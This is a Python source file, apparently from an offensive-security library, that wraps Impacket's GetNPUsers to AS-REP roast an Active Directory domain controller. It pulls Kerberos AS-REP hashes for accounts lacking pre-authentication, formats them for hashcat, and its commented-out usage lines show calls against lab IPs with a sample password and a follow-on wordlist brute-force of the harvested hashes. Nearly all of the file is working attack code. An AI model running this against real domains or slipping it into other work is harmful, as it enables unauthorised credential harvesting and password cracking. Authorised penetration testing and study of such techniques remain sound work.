from pympacket.attacks.GetNPUsers import GetUserNoPreAuth
from argparse import Namespace
import sys
from pympacket.models.common import User, Hash

def asreproast(domain, dc_ip, username='', password='', nthash=None, usersfile=None):
    if nthash is not None:
        nthash = f'aad3c435b514a4eeaad3b935b51304fe:{nthash}'

    # Default unauth param values
    no_pass = True
    request = False

    # Change parameters when calling with creds
    if username != '' or password != '' or nthash is not None:
        no_pass = False
        request = True
        usersfile = None # Ignore usersfile value when calling with creds
    elif usersfile is None: # If an usersfile is not provided when calling without creds
        print("You must specify a list of users to check.", file=sys.stderr)
        return None

    #logging.disable(sys.maxsize) #Disable impacket logger
    cmdLineOptions = Namespace(
        no_pass=no_pass,
        outputfile=None,
        usersfile=usersfile,
        format='hashcat',
        aesKey=None,
        k=False,
        request=request,
        dc_ip=dc_ip,
        dc_host=None,
        hashes=nthash
    )

    asreproasting = GetUserNoPreAuth(username, password, domain, cmdLineOptions)
    asreps = asreproasting.run()
    result = []
    if asreps is not None:
        for asrep in asreps:
            current_user = User()
            current_hash = Hash()
            user = asrep.split('$')[3].split('@')[0]
            current_user.username = user
            current_hash.type = 'asrep'
            current_hash.value = asrep
            current_user.krb_hash = [current_hash]
            result.append(current_user)
            #user_result = {}
            #user_result['username'] = user
            #user_result['asrep'] = asrep
            #result.append(user_result)
        return result
    else:
        return None

# Output is a list of dict in the following format, None if error:
# [{'username':'svc_sql', 'asrep':'$krb5asrep$...'}]

#asrep_out = asreproast(dc_ip='192.168.56.133', domain='contoso.local', usersfile='SamAccountNames.txt') # Unauth
#asrep_out = asreproast(dc_ip='192.168.116.10', username='l.douglas', password='Football1', domain='contoso.local') # Auth

#print(asrep_out)
#
#if asrep_out is not None:
#    for asrep in asrep_out:
#        result = bruteforce('fasttrack.txt', asrep['asrep'], 'asrep')
#        if result is not None:
#            print(f"{asrep['username']}:{result}")